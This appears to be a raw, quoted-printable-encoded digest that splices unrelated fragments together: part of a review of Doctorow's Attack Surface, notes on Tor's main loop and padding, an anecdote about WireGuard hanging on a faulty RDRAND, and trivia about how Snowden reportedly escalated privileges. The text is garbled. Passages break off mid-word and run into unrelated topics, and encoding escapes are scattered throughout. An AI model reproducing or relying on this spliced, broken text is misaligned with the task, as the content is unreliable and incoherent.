l the techniques that worked to stop mass surveillance in Little Brother be=
come useless the instant a sophisticated adversary has identified you as a =
subject for targeted surveillance.
At one point, Doctorow writes in Masha=E2=80=99s voice about the hero of hi=

is past self:
=E2=80=9CWhat I truly hated about Marcus Yallow, above all else, was this: =
He gave people hope when no hope was called for. He told them they could ma=
ster their computers and their networks, communicate in private and in secr=
et, form networks of mutual aid and use them to bring down the powerful and=
 unjust. But I=E2=80=99ve been on the other side of the data center, I=
=E2=80=99ve seen how hard it is to cover your tracks, to be perfect in your=
 opsec, to know who and what to trust, to write code that is flawless.=
But Doctorow says that the intention ofAttack Surfacewasn=E2=80=99t to swin=
g in the other direction on the spectrum between =E2=80=9Cnerd triumphalism=
=E2=80=9D and =E2=80=9Cnerd despair,=E2=80=9D as he puts it. Instead, it=
=E2=80=99s to find a more nuanced middle ground, one that acknowledges that=
 technology can win some battles, but that others must be won with human wi=
llpower and political struggle, sometimes with the aim of controlling techn=
ology=E2=80=99s most dangerous applications.
The title ofAttack Surfacecomes from thecybersecurity term for a target sys=
tem=E2=80=99s exposure to exploitation: The more attack surfaces=E2=80=
=94external connections and inputs=E2=80=94the more vulnerable the system i=
s to hacking. But Doctorow says he chose the title because he defines =
=E2=80=9Cattack surface=E2=80=9D as the volatile edge where two systems mee=
t. Those systems might be a hackable device and the internet, or technology=
 and the law, or even technology and human beings, with each having the pow=
er to potentially exploit the other.
Those edges add up to a far more complex and unpredictable picture than the=
 one Doctorow sketched inLittle Brother. The world ofAttack Surfaceis one w=
here technology isn=E2=80=99t necessarily a force for good or evil, but whe=
re it has to be bent to the right cause by human ethics. =E2=80=9CTechnolog=
y is a tool that gives us space to make political change. Politics are a to=
ol we use to open the space for making better technology,=E2=80=9D one wise=
 character summarizes near the end ofAttack Surface, lecturing both Marcus =
and Masha. =E2=80=9CIt=E2=80=99s like parallel parking: You go as far as yo=
u can in one direction, then back up and go as far as you can in the other.=
Across its three-book arc, theLittle Brothernow achieves something similar:=
 After driving his car to the extremes of digital idealism, Doctorow has ba=
cked it up to the other extreme of digital pessimism. And in doing so, he=
=E2=80=99s carved out a space for himself to fit a far messier truth betwee=

for Unix like systems, you will enter tor here:
  note that here you setup environment, signal handling, read configs, setup =
services (like hs, tracing, etc.) and then begin the main loop.
tor's main loop enters here:
  you can see how the first time through, various one-time tasks are done, th=
en afterward all threads in the event thread pool just process read/write e=
vents, again and again :)
if you're thinking of circuit padding, consider the client-edge padding cap=
ability already built:
  you could monitor sockets and streams for activity, then queue chaff traffi=
c if needed to fill in toward target rate, or some time-delayed logarithmic=
 fall-off...
have fun!

Wireguard uses entropy instructions like RDRAND directly, with no mixing. E=
ven BSD and Linux know this is a bad idea.
As it turns out, WireGuard relies on RDRAND (when available) to generate ne=
w session IDs. The session IDs need to be unique, and WireGuard wants them =
not to be simple consecutive integers, so it pulls a pseudorandom value fro=
m RDRAND, compares it against its existing session ID list to make sure the=
re's no collision, then assigns it to the session.
Read that last part again carefully=E2=80=94it makes sure there's no collis=
ion first. If an existing session has the same ID as the new number, WireGu=
ard asks RDRAND for another "random" number, checks it for uniqueness, and =
so on. Since RDRAND on my system=E2=80=94and any non-microcode-updated Ryze=
n 3000 system=E2=80=94always returned 0xFFFFFFFF no matter what, that means=
 infinite loop. Infinite loops in kernel code are bad; they introduce you t=
o the value of the hardware reset button in a hurry.
at least wireguard is fast? :P

recall that one of the charges against Snowden was "hacking his superior's =
password". that of course sounded absurd, given the security controls in us=
e at NSA. (E.g. smartcards and certificates)
turns out the "hacking passwords" was removing interactive authentication f=
rom the encrypted certificate. this was done for "integration & automation"=
 purposes, but had the side benefit of letting Snowden masquerade with high=
er privs as desired...
(less fun than another conjecture: manipulating Windows smartcard sessions,=
 e.g. setting scremoveoption to "No Action" instead of "Force Logoff"...)
that's not the most significant fact, merely a trivia.  so tell us james, w=
hat is this document?
